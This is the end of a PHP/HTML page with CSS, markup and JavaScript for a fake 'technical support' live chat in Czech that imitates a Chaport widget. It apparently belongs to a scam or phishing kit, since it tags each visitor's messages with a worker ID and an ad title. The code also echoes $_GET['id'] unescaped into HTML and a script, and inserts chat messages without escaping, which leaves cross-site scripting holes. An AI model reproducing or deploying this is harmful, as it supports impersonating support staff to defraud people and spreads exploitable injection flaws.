-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column } #pg-w6b9d1bae-0 > .panel-grid-cell , #pg-w6b9d1bae-0 > .panel-row-style > .panel-grid-cell { width:100%;margin-right:0 } #pgc-w6b9d1bae-0-0 , #pgc-w6b9d1bae-0-1 { margin-bottom:30px } #pg-w6b9d1bae-0 { margin-bottom:px } #pl-w6b9d1bae .panel-grid-cell { padding:0 } #pl-w6b9d1bae .panel-grid .panel-grid-cell-empty { display:none } #pl-w6b9d1bae .panel-grid .panel-grid-cell-mobile-last { margin-bottom:0px }  } /* Layout w008c7584 */ #pgc-w008c7584-0-0 , #pgc-w008c7584-0-2 { width:25%;width:calc(25% - ( 0.75 * 30px ) ) } #pgc-w008c7584-0-1 { width:50%;width:calc(50% - ( 0.5 * 30px ) ) } #pl-w008c7584 .so-panel { margin-bottom:30px } #pl-w008c7584 .so-panel:last-child { margin-bottom:0px } #pg-w008c7584-0.panel-no-style, #pg-w008c7584-0.panel-has-style > .panel-row-style { -webkit-align-items:flex-start;align-items:flex-start } #pgc-w008c7584-0-2 { align-self:auto } @media (max-width:780px){ #pg-w008c7584-0.panel-no-style, #pg-w008c7584-0.panel-has-style > .panel-row-style { -webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column } #pg-w008c7584-0 > .panel-grid-cell , #pg-w008c7584-0 > .panel-row-style > .panel-grid-cell { width:100%;margin-right:0 } #pgc-w008c7584-0-0 , #pgc-w008c7584-0-1 { margin-bottom:30px } #pg-w008c7584-0 { margin-bottom:px } #pl-w008c7584 .panel-grid-cell { padding:0 } #pl-w008c7584 .panel-grid .panel-grid-cell-empty { display:none } #pl-w008c7584 .panel-grid .panel-grid-cell-mobile-last { margin-bottom:0px }  } </style>
<iframe name="__tcfapiLocator" style="display: none;" src="./pop_files/saved_resource.html"></iframe>
<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #de002f;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #de002f;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #de002f;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>
<div id="offonthechap">
<div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
<div class="chaport-launcher" style="left: 0px; right: 0px;">
<div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
<div class="chaport-launcher-chat-icon"></div>
<input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
<input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
<input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
<div class="chaport-launcher-close-icon"></div>
<div class="chaport-launcher-operator-photo"></div>
</div>
</div>
<div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
<div class="chaport-inner">
<div class="main-textblock">
<div class="operatorblock">
<div class="operatorblock-content" style="display: flex;">
<div id="operator-photo">
<img id="oper-photo-img" src="./pop_files/operator-img.png">
<div class="operator-name">Sofia</div>
</div>
<div class="team-wrapper">
<div class="team">Technická podpora</div>
<div class="activity-indicator">
<div class="with-status" style="display: inline-block;">
<div class="status-online" style="display: inline-block;">
</div>Online</div>
</div>
</div>
</div>
</div>
<div class="chat-block">
<div id="chat">
<div class="operators-msg" id="greeting-msg" style="display: none;">
<div class="operators-photo"><img src="./pop_files/operator-img.png"></div>
</div>
</div>
<div id="input-msg" style="display: flex;">
<input type="text" name="smstosup1" id="smstosup1" placeholder="Zadejte svou zprávu...">
<button id="smstosupbutton1" onclick="sendMessage()" type="button">
<div class="chaport-send-icon">
<svg width="18" height="18" viewBox="0 0 535.5 535.5">
<polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">
</polygon>
</svg>
</div>
</button>
</div>
</div>
</div>
</div>
</div>
<div class="chaport-big-shadow"></div>
</div>
</div>
<script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
<div id="privacy-overlay" class="tc-reset-css tc-privacy-overlay" style="display: none; z-index: 999997;"></div></body></html>